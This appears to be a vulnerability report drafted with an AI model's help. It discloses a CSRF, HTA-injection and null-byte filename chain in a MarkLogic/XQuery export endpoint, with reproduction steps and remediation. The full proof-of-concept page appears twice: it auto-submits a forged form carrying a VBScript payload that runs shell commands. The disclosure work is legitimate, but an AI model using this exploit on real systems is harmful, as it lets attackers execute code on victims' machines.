#### **1. Summary**

> "I have discovered a Critical vulnerability chain consisting of **Cross-Site Request Forgery (CSRF)**, **HTML Application (HTA) Injection**, and **Filename Null Byte Injection**. An attacker can force an authenticated user to download and execute a malicious `.hta` file, leading to full system compromise (RCE) on Windows-based clients."

---

#### **2. The Vulnerability Chain**

- **Missing CSRF Protection:** The `/history/export.xqy` endpoint lacks anti-CSRF tokens and does not enforce `SameSite` cookie attributes, allowing external sites to trigger POST requests.
    
- **HTA Injection:** The `exportData` parameter allows raw HTML/VBScript injection, which is the core of an HTA payload.
    
- **Null Byte Extension Bypass:** The `exportType` parameter is vulnerable to a Null Byte injection (`%00`). This allows an attacker to terminate the filename string at `.hta`, bypassing the server-side logic that attempts to append `.xls`.
    

---

#### **3. Step-by-Step Reproduction (PoC)**

1. Log in to the application at `http://localhost:8002`.
    
2. Host the provided `exploit.html` on a local web server.
    
3. Visit `exploit.html` in the same browser session.
    
4. Observe that a file named `overview.hta` is automatically downloaded.
    
5. (Optional Impact Note): On a Windows system, opening this file executes the embedded VBScript, launching `chrome.exe` and performing a search for "hacked".
    

---

#### **4. Impact**

- **Confidentiality:** Attacker can execute scripts to steal local files or browser data.
    
- **Integrity:** Attacker can modify system files or install persistence (malware/backdoors).
    
- **Availability:** Attacker can execute commands to shut down or wipe the victim's machine.
    

---

#### **5. Recommended Remediation**

- **Implement Anti-CSRF Tokens:** Require a unique, unpredictable token for every export request.
    
- **Enforce SameSite=Lax:** Set the `auth` cookie attribute to `SameSite=Lax` or `Strict`.
    
- **Strict Filename Validation:** Use a whitelist for the `exportType` parameter (e.g., only allow `csv` or `xls`) and strictly strip any null bytes (`%00`) or special characters before the file is written to the response.
    

---

### **Final Pro-Tip for your Ubuntu setup**

Take a screenshot of your **Downloads folder** showing the `overview.hta` file and a screenshot of **Burp Suite's Hex view** showing the `25 30 30` (the literal `%00`). These two images are the "smoking gun" that proves the extension bypass worked.

**Would you like me to help you write a professional "Remediation" section specifically for the MarkLogic/XQuery developers?**


<!DOCTYPE html>
<html>
<head>
    <title>Generating Report...</title>
</head>
<body>
    <h1>Please wait...</h1>
    <p>Your download will start shortly.</p>

    <script>
        function triggerDownload() {
            // 1. Create a form element
            var form = document.createElement("form");
            form.method = "POST";
            form.action = "http://localhost:8002/history/export.xqy";
            form.enctype = "application/x-www-form-urlencoded";

            // 2. The HTA Payload
            var htaData = `<html><head><title>Export</title><script language="VBScript">Sub Window_OnLoad: Set objShell = CreateObject("WScript.Shell"): objShell.Run "chrome.exe https://www.google.com/search?q=hacked": Self.Close: End Sub<\/script></head><body><p>Exporting...</p></body></html>`;

            // 3. Create Input 1: exportData
            var input1 = document.createElement("input");
            input1.type = "hidden";
            input1.name = "exportData";
            input1.value = htaData;
            form.appendChild(input1);

            // 4. Create Input 2: exportType (The Null Byte)
            var input2 = document.createElement("input");
            input2.type = "hidden";
            input2.name = "exportType";
            // JavaScript can handle the raw null character here
            // This is the most reliable way to prevent %2500
            input2.value = "overview.hta\0"; 
            form.appendChild(input2);

            // 5. Submit the form
            document.body.appendChild(form);
            form.submit();
        }

        window.onload = triggerDownload;
    </script>
</body>
</html>


## Gemini said

Here is your code wrapped in a Markdown code block, ready to be pasted into your bug report or README.

HTML

```
<!DOCTYPE html>
<html>
<head>
    <title>Generating Report...</title>
</head>
<body>
    <h1>Please wait...</h1>
    <p>Your download will start shortly.</p>

    <script>
        function triggerDownload() {
            // 1. Create a form element
            var form = document.createElement("form");
            form.method = "POST";
            form.action = "http://localhost:8002/history/export.xqy";
            form.enctype = "application/x-www-form-urlencoded";

            // 2. The HTA Payload
            var htaData = `<html><head><title>Export</title><script language="VBScript">Sub Window_OnLoad: Set objShell = CreateObject("WScript.Shell"): objShell.Run "chrome.exe https://www.google.com/search?q=hacked": Self.Close: End Sub<\/script></head><body><p>Exporting...</p></body></html>`;

            // 3. Create Input 1: exportData
            var input1 = document.createElement("input");
            input1.type = "hidden";
            input1.name = "exportData";
            input1.value = htaData;
            form.appendChild(input1);

            // 4. Create Input 2: exportType (The Null Byte)
            var input2 = document.createElement("input");
            input2.type = "hidden";
            input2.name = "exportType";
            // JavaScript can handle the raw null character here
            // This is the most reliable way to prevent %2500
            input2.value = "overview.hta\0"; 
            form.appendChild(input2);

            // 5. Submit the form
            document.body.appendChild(form);
            form.submit();
        }

        window.onload = triggerDownload;
    </script>
</body>
</html>
```